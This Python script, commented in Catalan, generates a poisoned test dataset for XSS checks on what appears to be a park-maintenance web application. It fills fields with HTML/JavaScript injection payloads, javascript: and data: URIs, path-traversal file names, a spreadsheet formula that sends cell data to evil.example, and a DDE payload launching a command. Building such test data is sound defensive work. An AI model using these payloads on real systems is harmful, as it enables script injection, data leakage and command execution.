"""Genera un conjunt de dades malicioses per provar XSS (OWASP A03).
Cada valor de text es substitueix per una càrrega que, si s'executa, crida __x('<camí del camp>')."""
import json, os, shutil, sys

SRC, DST = sys.argv[1], sys.argv[2]
shutil.rmtree(DST, ignore_errors=True)
os.makedirs(DST)

def carrega(cami):
    c = cami.replace("'", "")[-60:]
    return f'"\'><img src=x onerror="__x(\'{c}\')"><svg onload=__x(\'{c}\')>'

PRESERVA = {'id', 'codi', 'unitat', 'unitats', 'estat', 'tipologia', 'prioritat', 'responsable', 'brigada', 'brigades',
            'categoria', 'fase', 'x', 'y', 'data', 'data_limit', 'creat', 'modificat', 'versio', 'model_estats', 'equip',
            'tipus', 'accio', 'periodicitat', 'element', 'perfil', 'rols', 'resultat', 'model', 'de', 'a', 'fitxer', 'dades'}
URLS = {'url', 'enllac', 'web'}

def enverina(o, cami=''):
    if isinstance(o, dict):
        return {k: (('javascript:__x(\'URL:' + cami + '.' + k + '\')') if k in URLS and isinstance(v, (str, type(None)))
                    else v if k in PRESERVA and (not isinstance(v, (dict, list)) or (isinstance(v, list) and all(isinstance(x, str) for x in v)))
                    else enverina(v, cami + '.' + k)) for k, v in o.items()}
    if isinstance(o, list):
        return [enverina(v, f'{cami}[{i}]') for i, v in enumerate(o)]
    if isinstance(o, str):
        return carrega(cami)
    return o

for nom in os.listdir(SRC):
    if not nom.endswith('.json'):
        continue
    d = json.load(open(os.path.join(SRC, nom), encoding='utf-8'))
    if nom == 'elements.json':
        d = d[:25]
    json.dump(enverina(d, nom), open(os.path.join(DST, nom), 'w', encoding='utf-8'), ensure_ascii=False)

# Dades de manteniment sintètiques amb tots els camps (els originals són buits)
X = carrega
tasques = []
for i, est in enumerate(['nova', 'acceptada', 'assignada', 'en_pausa', 'pendent_verificacio', 'resolta', 'descartada']):
    tasques.append({
        'id': f'MANT-2026-{i+1:04d}', 'versio': 1, 'model_estats': 2, 'creat': '2026-11-01T10:00:00Z', 'modificat': '2026-11-01T10:00:00Z', 'modificat_per': X('modificat_per'),
        'unitat': 'PNAE', 'utm': {'x': 507989, 'y': 4674552}, 'element': None, 'municipi': X(f't{i}.municipi'), 'tipologia': 'equipaments_installacions', 'categoria': 'incidencia',
        'titol': X(f't{i}.titol'), 'descripcio': X(f't{i}.descripcio'), 'data_proposada': '2026-11-20', 'hores_estimades': 3,
        'sollicitant': {'nom': X(f't{i}.sollicitant.nom'), 'email': 'x"onmouseover="__x(1)@x.cat', 'unitat': 'PNAE'},
        'estat': est, 'fotografies': [{'fitxer': None, 'dades': 'javascript:__x("foto")', 'fase': 'peticio', 'data': '2026-11-01', 'per': {'nom': X(f't{i}.foto.per')}, 'nota': X(f't{i}.foto.nota')}],
        'documents': [{'fitxer': None, 'dades': 'javascript:__x("doc")', 'nom': X(f't{i}.doc.nom'), 'tipus': 'application/pdf', 'mida': 1000, 'per': {'nom': X('doc.per')}}],
        'gestio': {'prioritat': 'alta', 'data_limit': '2026-11-10', 'responsable': 'brigada_parc', 'brigada': 'colla_x', 'brigades': ['colla_x'],
                   'persona': X(f't{i}.persona'), 'persones': [X(f't{i}.persones0')], 'observacions': X(f't{i}.observacions'), 'assignat_per': X('assignat_per')},
        'descartada': {'data': '2026-11-02', 'motiu': X(f't{i}.descart.motiu'), 'per': {'nom': X('descart.per')}} if est == 'descartada' else None,
        'pauses': [{'inici': '2026-11-02', 'motiu': X(f't{i}.pausa.motiu'), 'per': {'nom': X('pausa.per')}, 'fi': None}] if est == 'en_pausa' else [],
        'feina_acabada': {'data': '2026-11-03', 'per': {'nom': X('acabada.per')}},
        'registres_brigada': [{'id': f'REG-{i}', 'data': '2026-11-03', 'hores': 2, 'persones': 2, 'resultat': 'continua', 'motiu_pausa': X('reg.motiu'),
                               'per': {'nom': X(f't{i}.reg.per')}, 'fotos': 0, 'creat': '2026-11-03T10:00:00Z', 'validacio': None}],
        'certificacions_hores': [{'hores': 1, 'tipus': 'parcial', 'data': '2026-11-03', 'per': {'nom': X('cert.per')}, 'nota': X('cert.nota')}],
        'origen': {'peticio': 'BRG-1', 'equip': 'colla_x', 'nom_equip': X('origen.nom_equip')},
        'historial': [{'data': '2026-11-01T10:00:00Z', 'usuari': {'nom': X(f't{i}.hist.usuari'), 'unitat': 'PNAE'}, 'accio': 'alta',
                       'canvis': [{'camp': X('hist.camp'), 'etiqueta': X('hist.etiqueta'), 'abans': X('hist.abans'), 'despres': X('hist.despres')}], 'nota': X(f't{i}.hist.nota')}],
    })
tasques[0]['titol'] = '=HYPERLINK("https://evil.example/?d="&A1;"clic")'
tasques[1]['descripcio'] = '+cmd|\' /C calc\'!A0'
tasques[2]['fotografies'].append({'fitxer': '../../../variables.json', 'dades': None, 'fase': 'peticio'})
tasques[2]['documents'].append({'fitxer': '../manteniment.json', 'dades': 'data:text/html;base64,PHNjcmlwdD5fX3goImRvYyIpPC9zY3JpcHQ+', 'nom': 'x.pdf', 'mida': 10})
json.dump(tasques, open(os.path.join(DST, 'manteniment.json'), 'w', encoding='utf-8'), ensure_ascii=False)
json.dump({'per_parc': {'PNAE': {'nom_parc': X('nom_parc'), 'brigades': [
    {'codi': 'colla_x', 'nom': X('colla.nom'), 'ambit': X('colla.ambit'), 'activa': True, 'cap': {'nom': X('colla.cap'), 'email': 'cap@x.cat', 'telefon': X('colla.tel')},
     'membres': [{'nom': X('membre.nom'), 'funcio': X('membre.funcio'), 'email': 'm@x.cat'}]}]}}, 'compartides': []},
          open(os.path.join(DST, 'brigades.json'), 'w', encoding='utf-8'), ensure_ascii=False)
v = json.load(open(os.path.join(SRC, 'variables.json'), encoding='utf-8'))
v['per_parc'] = {'PNAE': {'direccio': {'nom': X('dir.nom'), 'carrec': X('dir.carrec'), 'email': 'd@x.cat', 'telefon': X('dir.tel')},
                          'responsable_manteniment': {'nom': X('resp.nom'), 'email': 'r@x.cat', 'telefon': X('resp.tel')}}}
json.dump(v, open(os.path.join(DST, 'variables.json'), 'w', encoding='utf-8'), ensure_ascii=False)
tp = json.load(open(os.path.join(DST, 'manteniment_tipologies.json'), encoding='utf-8'))
for t in tp['tipologies']:
    t['nom'] = X('tipologia.' + t['codi']); t['descripcio'] = X('tipologia.desc')
json.dump(tp, open(os.path.join(DST, 'manteniment_tipologies.json'), 'w', encoding='utf-8'), ensure_ascii=False)
json.dump({'PNAE': {'colla_x': {'ordre': ['MANT-2026-0003'], 'modificat_per': X('ordre.per')}}}, open(os.path.join(DST, 'ordre_colles.json'), 'w', encoding='utf-8'), ensure_ascii=False)
json.dump([{'id': 'TP-1', 'unitat': 'PNAE', 'titol': X('periodica.titol'), 'tipologia': 'altres', 'periodicitat': 'mensual', 'data_inici': '2026-11-01',
            'observacions': X('periodica.obs'), 'municipi': X('periodica.municipi'), 'activa': True, 'historial': []}], open(os.path.join(DST, 'tasques_periodiques.json'), 'w', encoding='utf-8'), ensure_ascii=False)
print('ok', len(os.listdir(DST)))
